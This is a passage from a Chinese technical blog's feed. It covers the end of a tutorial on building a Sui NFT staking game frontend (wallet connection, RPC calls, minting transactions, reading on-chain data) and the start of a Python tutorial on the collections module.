class="name">Image</span> <span class="attr">src</span>=<span class="string">&#123;</span>`$&#123;<span class="attr">item.url</span>&#125;`&#125; <span class="attr">width</span>=<span class="string">&#123;48&#125;</span> <span class="attr">height</span>=<span class="string">&#123;48&#125;</span> <span class="attr">alt</span>=<span class="string">&#123;</span>`$&#123;<span class="attr">item.objectId</span>&#125;`&#125; <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> itemIn ? removeUnstaked(item.objectId) : addUnstaked(item.objectId)&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 处理质押的</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">renderStaked</span>(<span class="params">item: <span class="built_in">any</span>, <span class="keyword">type</span>: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> itemIn = stakedSelected.<span class="title function_">includes</span>(item.<span class="property">objectId</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">key</span>=<span class="string">&#123;item.objectId&#125;</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">marginRight:</span> &quot;<span class="attr">5px</span>&quot;, <span class="attr">marginLeft:</span> &quot;<span class="attr">5px</span>&quot;, <span class="attr">border:</span> <span class="attr">itemIn</span> ? &quot;<span class="attr">2px</span> <span class="attr">solid</span> <span class="attr">red</span>&quot; <span class="attr">:</span> &quot;<span class="attr">2px</span> <span class="attr">solid</span> <span class="attr">rgb</span>(<span class="attr">0</span>,<span class="attr">0</span>,<span class="attr">0</span>,<span class="attr">0</span>)&quot;, <span class="attr">overflow:</span> &#x27;<span class="attr">hidden</span>&#x27;, <span class="attr">display:</span> &quot;<span class="attr">inline-block</span>&quot; &#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;flex flex-col items-center&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">fontSize:</span> &quot;<span class="attr">0.75rem</span>&quot;, <span class="attr">height:</span> &quot;<span class="attr">1rem</span>&quot; &#125;&#125;&gt;</span>#&#123;item.index&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Image</span> <span class="attr">src</span>=<span class="string">&#123;</span>`$&#123;<span class="attr">item.url</span>&#125;`&#125; <span class="attr">width</span>=<span class="string">&#123;48&#125;</span> <span class="attr">height</span>=<span class="string">&#123;48&#125;</span> <span class="attr">alt</span>=<span class="string">&#123;</span>`$&#123;<span class="attr">item.objectId</span>&#125;`&#125; <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> itemIn ? removeStaked(item.objectId) : addStaked(item.objectId)&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="4-3-lian-jie-qian-bao">4.3 连接钱包</span></h3><p>我们使用 Suiet 钱包开发的 <code>@suiet/wallet-kit</code> 包连接 Sui 钱包，从包对应的 WalletContextState 可以看出， <code>useWallet</code> 包含了我们在构建 App 时会使用到的基本信息和功能，比如钱包信息，链信息，连接状态信息，以及发送交易，签名信息等。</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">WalletContextState</span> &#123;</span><br><span class="line">    <span class="attr">configuredWallets</span>: <span class="title class_">IWallet</span>[];</span><br><span class="line">    <span class="attr">detectedWallets</span>: <span class="title class_">IWallet</span>[];</span><br><span class="line">    <span class="attr">allAvailableWallets</span>: <span class="title class_">IWallet</span>[];</span><br><span class="line">    <span class="attr">chains</span>: <span class="title class_">Chain</span>[];</span><br><span class="line">    <span class="attr">chain</span>: <span class="title class_">Chain</span> | <span class="literal">undefined</span>;</span><br><span class="line">    <span class="attr">name</span>: <span class="built_in">string</span> | <span class="literal">undefined</span>;</span><br><span class="line">    <span class="attr">adapter</span>: <span class="title class_">IWalletAdapter</span> | <span class="literal">undefined</span>;</span><br><span class="line">    <span class="attr">account</span>: <span class="title class_">WalletAccount</span> | <span class="literal">undefined</span>;</span><br><span class="line">    <span class="attr">address</span>: <span class="built_in">string</span> | <span class="literal">undefined</span>;</span><br><span class="line">    <span class="attr">connecting</span>: <span class="built_in">boolean</span>;</span><br><span class="line">    <span class="attr">connected</span>: <span class="built_in">boolean</span>;</span><br><span class="line">    <span class="attr">status</span>: <span class="string">&quot;disconnected&quot;</span> | <span class="string">&quot;connected&quot;</span> | <span class="string">&quot;connecting&quot;</span>;</span><br><span class="line">    <span class="attr">select</span>: <span class="function">(<span class="params">walletName: <span class="built_in">string</span></span>) =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line">    <span class="attr">disconnect</span>: <span class="function">() =&gt;</span> <span class="title class_">Promise</span>&lt;<span class="built_in">void</span>&gt;;</span><br><span class="line">    <span class="attr">getAccounts</span>: <span class="function">() =&gt;</span> <span class="keyword">readonly</span> <span class="title class_">WalletAccount</span>[];</span><br><span class="line">    <span class="title function_">signAndExecuteTransaction</span>(<span class="attr">transaction</span>: <span class="title class_">SuiSignAndExecuteTransactionInput</span>): <span class="title class_">Promise</span>&lt;<span class="title class_">SuiSignAndExecuteTransactionOutput</span>&gt;;</span><br><span class="line">    <span class="attr">signMessage</span>: <span class="function">(<span class="params">input: &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">        message: <span class="built_in">Uint8Array</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    &#125;</span>) =&gt;</span> <span class="title class_">Promise</span>&lt;<span class="title class_">ExpSignMessageOutput</span>&gt;;</span><br><span class="line">    <span class="attr">on</span>: &lt;E <span class="keyword">extends</span> <span class="title class_">WalletEvent</span>&gt;<span class="function">(<span class="params">event: E, listener: WalletEventListeners[E]</span>) =&gt;</span> <span class="function">() =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">declare</span> <span class="keyword">const</span> <span class="title class_">WalletContext</span>: <span class="keyword">import</span>(<span class="string">&quot;react&quot;</span>).<span class="property">Context</span>&lt;<span class="title class_">WalletContextState</span>&gt;;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">declare</span> <span class="keyword">function</span> <span class="title function_">useWallet</span>(<span class="params"></span>): <span class="title class_">WalletContextState</span>;</span><br></pre></td></tr></table></figure><p>在 <code>src/components/SuiConnect.tsx</code> 中，我们可以很方便的设置钱包连接功能：</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  <span class="title class_">ConnectButton</span>,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;@suiet/wallet-kit&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">SuiConnect</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">ConnectButton</span>&gt;</span>Connect Wallet<span class="tag">&lt;/<span class="name">ConnectButton</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后，我们将需要使用的信息在 <code>src/pages/game.tsx</code> 中引入：</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  useWallet,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;@suiet/wallet-kit&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">Home</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123; signAndExecuteTransaction, connected, account, status &#125; = <span class="title function_">useWallet</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 省略</span></span><br></pre></td></tr></table></figure><p>其中， <code>signAndExecuteTransaction</code> 方法用来签名并执行交易，支持 <code>moveCall</code> ， <code>transferSui</code>， <code>transferObject</code> 等交易。</p><h3><span id="4-4-rpc-jie-kou-diao-yong">4.4 RPC 接口调用</span></h3><p>我们使用官方提供的 <code>@mysten/sui.js</code> 库调用 Sui 的 RPC 接口，这个库支持了大部分 <a href="https://docs.sui.io/sui-jsonrpc">Sui JSON-RPC</a>，同时，还提供了一些额外的方法方便开发，例如：</p><ul><li><code>selectCoinsWithBalanceGreaterThanOrEqual</code> ：获取大于等于指定数量的coin对象ID数组</li><li><code>selectCoinSetWithCombinedBalanceGreaterThanOrEqual</code>：获取总和大于等于指定数量的coin对象ID数组</li></ul><p>这两个方法在需要在 NFT 铸造时支付 SUI 或者其他代币时十分有用。我们在 <code>game.tsx</code> 中引入 JsonProvider 进行初始化：</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件: src/pages/game.tsx</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">JsonRpcProvider</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@mysten/sui.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">Home</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 操作 client</span></span><br><span class="line">  <span class="keyword">const</span> provider = <span class="keyword">new</span> <span class="title class_">JsonRpcProvider</span>();</span><br><span class="line">    <span class="comment">// 调用</span></span><br><span class="line">    <span class="keyword">const</span> suiObjects = <span class="keyword">await</span> provider.<span class="title function_">selectCoinSetWithCombinedBalanceGreaterThanOrEqual</span>(account!.<span class="property">address</span>, suiCost)</span><br><span class="line"><span class="comment">// 其他省略</span></span><br></pre></td></tr></table></figure><p>其他方法的介绍可以参考库的文档，这里不多赘述。</p><h3><span id="4-5-zhu-zao-nft-deng-entry-fang-fa">4.5 铸造 NFT 等 entry 方法</span></h3><p>我们首先看到如何铸造 NFT：</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件: src/pages/game.tsx </span></span><br><span class="line">  <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">mint_nft</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> suiObjectIds = [] <span class="keyword">as</span> <span class="title class_">Array</span>&lt;<span class="built_in">string</span>&gt;</span><br><span class="line">    <span class="keyword">let</span> eggObiectIds = [] <span class="keyword">as</span> <span class="title class_">Array</span>&lt;<span class="built_in">string</span>&gt;</span><br><span class="line">        <span class="comment">// 获取足够的 SUI 或者 EGG 代币的对象ID</span></span><br><span class="line">    <span class="keyword">if</span> (collectionSupply &lt; <span class="variable constant_">PAID_TOKENS</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> suiObjects = <span class="keyword">await</span> provider.<span class="title function_">selectCoinSetWithCombinedBalanceGreaterThanOrEqual</span>(account!.<span class="property">address</span>, suiCost)</span><br><span class="line">      suiObjectIds = suiObjects.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">status</span> === <span class="string">&quot;Exists&quot;</span>).<span class="title function_">map</span>(<span class="function">(<span class="params">item: <span class="built_in">any</span></span>) =&gt;</span> item.<span class="property">details</span>.<span class="property">data</span>.<span class="property">fields</span>.<span class="property">id</span>.<span class="property">id</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> eggObjects = <span class="keyword">await</span> provider.<span class="title function_">selectCoinSetWithCombinedBalanceGreaterThanOrEqual</span>(account!.<span class="property">address</span>, eggCost, <span class="string">`<span class="subst">$&#123;PACKAGE_ID&#125;</span>::egg::EGG`</span>)</span><br><span class="line">      eggObiectIds = eggObjects.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">status</span> === <span class="string">&quot;Exists&quot;</span>).<span class="title function_">map</span>(<span class="function">(<span class="params">item: <span class="built_in">any</span></span>) =&gt;</span> item.<span class="property">details</span>.<span class="property">data</span>.<span class="property">fields</span>.<span class="property">id</span>.<span class="property">id</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 调用 moveCall 方法，构造交易并签名</span></span><br><span class="line">      <span class="keyword">const</span> resData = <span class="keyword">await</span> <span class="title function_">signAndExecuteTransaction</span>(&#123;</span><br><span class="line">        <span class="attr">transaction</span>: &#123;</span><br><span class="line">          <span class="attr">kind</span>: <span class="string">&#x27;moveCall&#x27;</span>,</span><br><span class="line">          <span class="attr">data</span>: <span class="title function_">mint</span>(<span class="literal">false</span>, suiObjectIds, eggObiectIds),</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;);</span><br><span class="line">            <span class="comment">// 检查结果</span></span><br><span class="line">      <span class="keyword">if</span> (resData.<span class="property">effects</span>.<span class="property">status</span>.<span class="property">status</span> !== <span class="string">&quot;success&quot;</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;failed&#x27;</span>, resData);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 设置 Mint 交易</span></span><br><span class="line">      <span class="title function_">setMintTx</span>(<span class="string">&#x27;https://explorer.sui.io/transaction/&#x27;</span> + resData.<span class="property">certificate</span>.<span class="property">transactionDigest</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;failed&#x27;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造 mint 方法所需要的参数</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">mint</span>(<span class="params">stake: <span class="built_in">boolean</span>, sui_objects: <span class="built_in">Array</span>&lt;<span class="built_in">string</span>&gt;, egg_objects: <span class="built_in">Array</span>&lt;<span class="built_in">string</span>&gt;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">packageObjectId</span>: <span class="variable constant_">PACKAGE_ID</span>,</span><br><span class="line">      <span class="attr">module</span>: <span class="string">&#x27;fox&#x27;</span>,</span><br><span class="line">      <span class="attr">function</span>: <span class="string">&#x27;mint&#x27;</span>,</span><br><span class="line">      <span class="attr">typeArguments</span>: [],</span><br><span class="line">      <span class="attr">arguments</span>: [</span><br><span class="line">        <span class="variable constant_">GLOBAL</span>, <span class="variable constant_">EGG_TREASUTY</span>, mintAmount.<span class="title function_">toString</span>(), stake, sui_objects, egg_objects</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">gasBudget</span>: <span class="number">1000000</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">        <span class="comment">// 其他部分省略</span></span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;text-center font-console pt-1&quot;</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> mint_nft()&#125;&gt;Mint<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>其中 <code>arguments</code> 参数对应 mint 方法所需要的参数。</p><p>同理，其他的 entry 方法的调用和签名也与 Mint 方法类似，分别为：</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 铸造并质押</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">mint_nft_stake</span>(<span class="params"></span>)</span><br><span class="line"><span class="comment">// 质押</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">stake_nft</span>(<span class="params"></span>)</span><br><span class="line"><span class="comment">// 提取</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">unstake_nft</span>(<span class="params"></span>)</span><br><span class="line"><span class="comment">// 收集 EGG</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">claim_egg</span>(<span class="params"></span>)</span><br></pre></td></tr></table></figure><h3><span id="4-6-he-yue-shu-ju-du-qu">4.6 合约数据读取</span></h3><p>对于 Sui 公链，除了调用合约，另一块难点是合约数据的读取。相对于 EVM 合约，Move的合约数据结构更复杂，更难读取。由于在 Sui 中，Object 对象被包装后可能无法进行追踪（详情可以参考官方 <a href="https://docs.sui.io/build/programming-with-objects">Object 教程系列</a>），因此在之前的数据结构设计中，Pack 和 Barn 中存储的 NFT 需要使用能进行追踪的数据结构。因此，ObjectTable 被做为基本的键值存储结构区别于不可追踪的 Table 数据类型。相应地，可以使用  <code>sui_getDynamicFieldObject</code> 来读取其中的数据，例如，通过读取保存在 PackStaked 中的 NFT 对象质押列表，从而通过 <code>getObjectBatch</code> 可以获取当前地址所有的质押的 NFT。</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取 Pack 中质押的 Fox NFT</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">objects</span>: <span class="built_in">any</span> = <span class="keyword">await</span> sui_client.<span class="title function_">getDynamicFieldObject</span>(packStakedObject, account!.<span class="property">address</span>);</span><br><span class="line">  <span class="keyword">if</span> (objects != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> fox_staked = objects.<span class="property">details</span>.<span class="property">data</span>.<span class="property">fields</span>.<span class="property">value</span></span><br><span class="line">    <span class="keyword">const</span> fox_stakes = <span class="keyword">await</span> provider.<span class="title function_">getObjectBatch</span>(fox_staked)</span><br><span class="line">    <span class="keyword">const</span> staked = fox_stakes.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">status</span> === <span class="string">&quot;Exists&quot;</span>).<span class="title function_">map</span>(<span class="function">(<span class="params">item: <span class="built_in">any</span></span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> foc = item.<span class="property">details</span>.<span class="property">data</span>.<span class="property">fields</span>.<span class="property">item</span></span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">objectId</span>: foc.<span class="property">fields</span>.<span class="property">id</span>.<span class="property">id</span>,</span><br><span class="line">        <span class="attr">index</span>: <span class="built_in">parseInt</span>(foc.<span class="property">fields</span>.<span class="property">index</span>),</span><br><span class="line">        <span class="attr">url</span>: foc.<span class="property">fields</span>.<span class="property">url</span>,</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">setStakedFox</span>(staked)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中， <code>packStakedObject</code> 对象ID通过 <code>GLOBAL</code> 对象 ID 获取得到。</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line">      <span class="keyword">const</span> <span class="attr">globalObject</span>: <span class="built_in">any</span> = <span class="keyword">await</span> provider.<span class="title function_">getObject</span>(<span class="variable constant_">GLOBAL</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pack_staked = globalObject.<span class="property">details</span>.<span class="property">data</span>.<span class="property">fields</span>.<span class="property">pack</span>.<span class="property">fields</span>.<span class="property">id</span>.<span class="property">id</span></span><br><span class="line"><span class="title function_">setPackStakedObject</span>(pack_staked)</span><br></pre></td></tr></table></figure><p>对于当前地址所拥有的未质押的NFT，需要通过读取全部对象ID后进行类型过滤才能得到：</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line">        <span class="comment">// 获取所有对象</span></span><br><span class="line">        <span class="keyword">const</span> objects = <span class="keyword">await</span> provider.<span class="title function_">getObjectsOwnedByAddress</span>(account!.<span class="property">address</span>)</span><br><span class="line"><span class="comment">// 过滤 FoxOrChicken 对象</span></span><br><span class="line">        <span class="keyword">const</span> foc = objects</span><br><span class="line">  .<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">type</span> === <span class="string">`<span class="subst">$&#123;PACKAGE_ID&#125;</span>::token_helper::FoxOrChicken`</span>)</span><br><span class="line">  .<span class="title function_">map</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">objectId</span>)</span><br><span class="line"><span class="keyword">const</span> foces = <span class="keyword">await</span> provider.<span class="title function_">getObjectBatch</span>(foc)</span><br><span class="line">        <span class="comment">// 过滤并读取信息，然后排序</span></span><br><span class="line"><span class="keyword">const</span> unstaked = foces.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">status</span> === <span class="string">&quot;Exists&quot;</span>).<span class="title function_">map</span>(<span class="function">(<span class="params">item: <span class="built_in">any</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">objectId</span>: item.<span class="property">details</span>.<span class="property">data</span>.<span class="property">fields</span>.<span class="property">id</span>.<span class="property">id</span>,</span><br><span class="line">    <span class="attr">index</span>: <span class="built_in">parseInt</span>(item.<span class="property">details</span>.<span class="property">data</span>.<span class="property">fields</span>.<span class="property">index</span>),</span><br><span class="line">    <span class="attr">url</span>: item.<span class="property">details</span>.<span class="property">data</span>.<span class="property">fields</span>.<span class="property">url</span>,</span><br><span class="line">    <span class="attr">is_chicken</span>: item.<span class="property">details</span>.<span class="property">data</span>.<span class="property">fields</span>.<span class="property">is_chicken</span>,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;).<span class="title function_">sort</span>(<span class="function">(<span class="params">n1, n2</span>) =&gt;</span> n1.<span class="property">index</span> - n2.<span class="property">index</span>)</span><br><span class="line">        <span class="comment">// 存储</span></span><br><span class="line"><span class="title function_">setUnstakedFox</span>(unstaked.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> !item.<span class="property">is_chicken</span>))</span><br><span class="line"><span class="title function_">setUnstakedChicken</span>(unstaked.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">is_chicken</span>))</span><br></pre></td></tr></table></figure><p>最后，对于当前地址中包含的 EGG 代币的余额，可以通过 <code>getCoinBalancesOwnedByAddress</code> 获得所有余额对象并进行求和得到。</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> balanceObjects = <span class="keyword">await</span> provider.<span class="title function_">getCoinBalancesOwnedByAddress</span>(account!.<span class="property">address</span>, <span class="string">`<span class="subst">$&#123;PACKAGE_ID&#125;</span>::egg::EGG`</span>)</span><br><span class="line"><span class="keyword">const</span> balances = balanceObjects.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">status</span> === <span class="string">&#x27;Exists&#x27;</span>).<span class="title function_">map</span>(<span class="function">(<span class="params">item: <span class="built_in">any</span></span>) =&gt;</span> <span class="built_in">parseInt</span>(item.<span class="property">details</span>.<span class="property">data</span>.<span class="property">fields</span>.<span class="property">balance</span>))</span><br><span class="line"><span class="keyword">const</span> initialValue = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">const</span> sumWithInitial = balances.<span class="title function_">reduce</span>(</span><br><span class="line">  <span class="function">(<span class="params">accumulator, currentValue</span>) =&gt;</span> accumulator + currentValue,</span><br><span class="line">  initialValue</span><br><span class="line">)</span><br><span class="line"><span class="title function_">setEggBalance</span>(sumWithInitial);</span><br></pre></td></tr></table></figure><h2><span id="zong-jie">总结</span></h2><p>至此，我们完成了狐狸游戏合约和前端代码的介绍。我们实现的狐狸游戏虽然功能上只有铸造，质押和提取这几个主要的功能，但是涉及 NFT 创建以及 Sui Move 的诸多语法，整体项目具有一定的难度。</p><p>这篇文章希望对有兴趣于 Sui 上的 NFT 的操作的同学有所帮助，也希望大家提出宝贵的建议和意见。项目目前只完成了初步的逻辑功能，还需要继续补充测试和形式验证，欢迎有兴趣的同学提交 Pull Request。</p><h2><span id="can-kao-wen-dang">参考文档</span></h2><ul><li><a href="https://docs.sui.io/">https://docs.sui.io/</a></li><li><a href="https://zhuanlan.zhihu.com/p/439236444">https://zhuanlan.zhihu.com/p/439236444</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Sui 类狼羊游戏项目开发实践
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="区块链" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>06. collections — Python 进阶</title>
    <link href="https://qiwihui.com/qiwihui-blog-123/"/>
    <id>https://qiwihui.com/qiwihui-blog-123/</id>
    <published>2022-08-13T01:54:25.710Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>Python 中的 <code>collections</code> 模块实现了专门的容器数据类型，提供了 Python 通用内置容器dict，list，set和tuple的替代方案。</p><p>包含以下工具：</p><ul><li><code>namedtuple</code>：用于创建具有命名字段的元组子类的工厂函数</li><li><code>OrderedDict</code>：用于记住条目添加顺序的dict子类</li><li><code>Counter</code>：用于计算可哈希对象的dict子类</li><li><code>defaultdict</code>：调用工厂函数以提供缺失值的dict子类</li><li><code>deque</code>： 列表式容器，支持两端都有快速追加和弹出</li></ul><p>在Python 3中，还存在其他一些模块（ChainMap，UserDict，UserList，UserString）。 有关更多参考，请参见 <a href="https://docs.python.org/3/library/collections.html">https://docs.python.org/3/library/collections.html</a>。</p><span id="more"></span><h3><span id="counter">Counter</span></h3><p>计数器是一个将元素存储为字典键的容器，而它们的计数则存储为字典值。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line">a = <span class="string">&quot;aaaaabbbbcccdde&quot;</span></span><br><span class="line">my_counter = Counter(a)</span><br><span class="line"><span class="built_in">print</span>(my_counter)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(my_counter.items())</span><br><span class="line"><span class="built_in">print</span>(my_counter.keys())</span><br><span class="line"><span class="built_in">print</span>(my_counter.values())</span><br><span class="line"></span><br><span class="line">my_list = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>]</span><br><span class="line">my_counter = Counter(my_list)</span><br><span class="line"><span class="built_in">print</span>(my_counter)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 出现最多的元素</span></span><br><span class="line"><span class="built_in">print</span>(my_counter.most_common(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回元素的迭代器，每个元素重复其计数次数</span></span><br><span class="line"><span class="comment"># 元素返回顺序任意</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(my_counter.elements()))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Counter(&#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;d&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;e&#x27;</span>: <span class="number">1</span>&#125;)</span><br><span class="line">dict_items([(<span class="string">&#x27;a&#x27;</span>, <span class="number">5</span>), (<span class="string">&#x27;b&#x27;</span>, <span class="number">4</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="number">3</span>), (<span class="string">&#x27;d&#x27;</span>, <span class="number">2</span>), (<span class="string">&#x27;e&#x27;</span>, <span class="number">1</span>)])</span><br><span class="line">dict_keys([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>])</span><br><span class="line">dict_values([<span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>])</span><br><span class="line">Counter(&#123;<span class="number">1</span>: <span class="number">4</span>, <span class="number">2</span>: <span class="number">3</span>, <span class="number">0</span>: <span class="number">2</span>, <span class="number">3</span>: <span class="number">2</span>, <span class="number">4</span>: <span class="number">1</span>&#125;)</span><br><span class="line">[(<span class="number">1</span>, <span class="number">4</span>)]</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure><h3><span id="namedtuple">namedtuple</span></h3><p><code>namedtuple</code> 是容易创建，轻量级的对象类型。 它们为元组中的每个位置分配含义，并允许使用更具可读性的带文档代码。 它们可以在使用常规元组的任何地方使用，并且它们增加了按名称而不是位置索引访问字段的能力。</p><figure class="highlight 